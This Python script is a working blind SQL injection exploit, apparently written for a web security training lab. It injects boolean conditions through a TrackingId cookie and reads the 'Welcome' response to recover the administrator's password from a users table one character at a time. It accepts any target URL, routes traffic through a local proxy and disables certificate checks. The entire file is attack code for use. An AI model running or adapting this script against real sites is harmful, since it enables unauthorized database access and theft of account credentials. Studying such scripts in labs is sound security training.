import sys
import urllib.parse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def exploit_password(url):
    extracted_password = ""
    for i in range(1, 14):
        for j in range(32, 126):
            sql_payload = f"' and (select ascii(substring(password,{i},1)) from users WHERE username='administrator')='{j}' --"
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {"TrackingId": "rnE0GkpwXapBKfra" + sql_payload_encoded, "session": "cFlts5wfaVl8OvzOQmCrxJQVhgm3iXeY"}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + extracted_password + chr(j))
                sys.stdout.flush()
            else:
                extracted_password += chr(j)
                sys.stdout.write('\r' + extracted_password)
                sys.stdout.flush()
                break
            


def main():
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: python3 {sys.argv[0]} <url>')
        print(f'[-] Example: python3 {sys.argv[0]} http://example.com')
        sys.exit(1)


    print("[+] Retrieving administrator password...")
    exploit_password(url)

if __name__ == '__main__':
    main()